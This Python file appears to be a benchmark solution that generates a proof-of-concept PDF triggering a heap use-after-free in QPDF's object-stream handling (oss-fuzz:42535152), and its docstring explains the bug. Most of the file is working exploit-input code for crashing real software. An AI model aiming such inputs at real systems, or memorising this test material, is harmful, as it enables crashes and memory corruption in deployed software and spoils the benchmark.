import zlib

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generates a Proof-of-Concept (PoC) input that triggers a Heap Use After Free
        vulnerability in QPDF (oss-fuzz:42535152).

        The vulnerability exists in how QPDF handles PDF files with multiple
        definitions for the same object ID, particularly when object streams are involved.
        When parsing an object stream, if an object within that stream already exists
        in the object cache (from a different, standalone definition), the vulnerable
        code erases the object from the cache. This frees the underlying object, but
        dangling pointers/handles to it may still exist. Subsequent access through
        such a dangling handle leads to a use-after-free.

        This PoC constructs a PDF with two versions of an object:
        1. An initial version where object 3 is defined inside an object stream (object 2).
        2. An incremental update that redefines object 3 as a standalone dictionary.

        When a QPDF-based application (like the `qpdf` command-line tool) processes
        this file to write a new one, the `QPDFWriter` logic triggers the bug:
        - It gets a list of all object handles.
        - It processes the old object stream (object 2).
        - This leads to the erasure of the cached standalone object 3.
        - Later, when the writer's main loop iterates to the handle for object 3,
          it accesses freed memory, causing a crash.
        """
        
        obj3_data_in_stream = b"<</In/Stream>>"
        
        header = b"3 4 "
        uncompressed_payload = header + obj3_data_in_stream
        first_offset = len(header)

        compressed_payload = zlib.compress(uncompressed_payload)
        
        pdf_parts = []
        
        pdf_parts.append(b"%PDF-1.7\n%\xde\xad\xbe\xef\n")

        # --- Part 1: Initial PDF structure ---
        
        obj1_offset = len(b"".join(pdf_parts))
        obj1 = b"1 0 obj\n<</Type /Catalog>>\nendobj\n"
        pdf_parts.append(obj1)
        
        obj2_offset = len(b"".join(pdf_parts))
        stream_dict = (
            f"<</Type /ObjStm "
            f"/N 1 "
            f"/First {first_offset} "
            f"/Length {len(compressed_payload)}>>"
        ).encode('ascii')
        obj2 = b"2 0 obj\n" + stream_dict + b"\nstream\n" + compressed_payload + b"\nendstream\n"
        pdf_parts.append(obj2)
        
        xref1_offset = len(b"".join(pdf_parts))
        xref1 = (
            b"xref\n"
            b"0 3\n"
            b"0000000000 65535 f \n"
            b"%010d 00000 n \n" % obj1_offset +
            b"%010d 00000 n \n" % obj2_offset
        )
        pdf_parts.append(xref1)
        
        trailer1 = (
            b"trailer\n"
            b"<</Size 3 /Root 1 0 R>>\n"
            b"startxref\n"
            b"%d\n" % xref1_offset +
            b"%%EOF\n"
        )
        pdf_parts.append(trailer1)

        # --- Part 2: Incremental update ---
        
        obj3_offset = len(b"".join(pdf_parts))
        obj3 = b"3 0 obj\n<</Standalone/Version>>\nendobj\n"
        pdf_parts.append(obj3)
        
        xref2_offset = len(b"".join(pdf_parts))
        xref2 = (
            b"xref\n"
            b"3 1\n"
            b"%010d 00000 n \n" % obj3_offset
        )
        pdf_parts.append(xref2)
        
        trailer2 = (
            b"trailer\n"
            b"<</Size 4 /Root 1 0 R /Prev %d>>\n" % xref1_offset +
            b"startxref\n"
            b"%d\n" % xref2_offset +
            b"%%EOF\n"
        )
        pdf_parts.append(trailer2)
        
        return b"".join(pdf_parts)